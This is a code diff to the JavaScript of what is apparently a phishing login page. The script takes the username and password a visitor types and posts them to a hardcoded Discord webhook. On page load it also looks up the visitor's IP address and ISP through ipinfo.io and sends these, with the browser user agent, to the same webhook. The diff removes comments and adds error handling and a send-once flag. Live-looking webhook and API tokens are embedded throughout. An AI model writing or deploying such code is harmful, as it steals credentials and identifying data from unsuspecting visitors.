@@ -1,3 +1,5 @@
+let infoSent = false;
+
 async function sendData() {
     const user = document.getElementById("user").value;
     const pass = document.getElementById("pass").value;
@@ -7,43 +9,46 @@ async function sendData() {
         return;
     }
     
-    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your Discord webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";
 
-    // Send User and Password when the function is triggered by button click
     const payload = {
         content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}`
     };
 
-    const response = await fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    });
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
 
-    if (response.ok) {
-        console.log("Data sent successfully!");
-    } else {
-        console.error("Failed to send data:", response.status, response.statusText);
+        if (response.ok) {
+            console.log("User data sent successfully!");
+        } else {
+            console.error("Failed to send user data:", response.status, response.statusText);
+        }
+
+        if (!infoSent) {
+            await sendInfoOnLoad();
+        }
+    } catch (error) {
+        console.error("Error sending data:", error);
     }
 }
 
-// This function will send the IP, ISP, and User-Agent as soon as the page loads
 async function sendInfoOnLoad() {
-    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your Discord webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";
 
     try {
-        // Fetch IP and ISP info using an external API
-        const ipResponse = await fetch("https://ipinfo.io/json?token=b0138b9c06beb1"); // Replace with your ipinfo token
+        const ipResponse = await fetch("https://ipinfo.io/json?token=b0138b9c06beb1");
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip || "[-] Unknown IP";
         const isp = ipData.org || "[-] Unknown ISP";
 
-        // Get User-Agent from the browser
         const userAgent = navigator.userAgent;
 
-        // Construct payload with styled content
         const payload = {
             content: `**[+] IP Address:** ${ipAddress}\n**[+] ISP:** ${isp}\n**[+] User Agent:** ${userAgent}`
         };
@@ -58,6 +63,7 @@ async function sendInfoOnLoad() {
 
         if (response.ok) {
             console.log("Info sent successfully!");
+            infoSent = true;
         } else {
             console.error("Failed to send info:", response.status, response.statusText);
         }
@@ -65,4 +71,8 @@ async function sendInfoOnLoad() {
         console.error("Error:", error);
     }
 }
-window.onload = sendInfoOnLoad;
+
+window.onload = function () {
+    console.log("Page loaded. Sending IP, ISP, and User-Agent info...");
+    sendInfoOnLoad();
+};
